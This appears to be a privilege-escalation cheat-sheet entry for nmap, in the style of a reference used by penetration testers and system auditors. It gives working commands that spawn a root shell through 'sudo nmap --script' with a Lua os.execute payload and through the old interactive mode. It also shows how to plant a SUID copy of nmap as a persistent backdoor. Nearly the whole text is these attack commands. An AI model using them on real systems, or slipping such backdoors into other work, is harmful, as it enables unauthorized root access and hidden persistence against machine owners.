***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * Input echo is disabled.
      TF=$(mktemp)
      echo 'os.execute("/bin/sh")' > $TF
      sudo nmap --script=$TF
    * The interactive mode, available on versions 2.02 to 5.21, can be used to
      execute shell commands.
      sudo nmap --interactive
      nmap> !sh
***** Limited SUID *****
It runs with the SUID bit set and may be exploited to access the file system,
escalate or maintain access with elevated privileges working as a SUID
backdoor. If it is used to run commands it only works on systems like Debian
that allow the default sh shell to run with SUID privileges.
    * Input echo is disabled.
      sudo sh -c 'cp $(which nmap) .; chmod +s ./nmap'

      TF=$(mktemp)
      echo 'os.execute("/bin/sh")' > $TF
      ./nmap --script=$TF
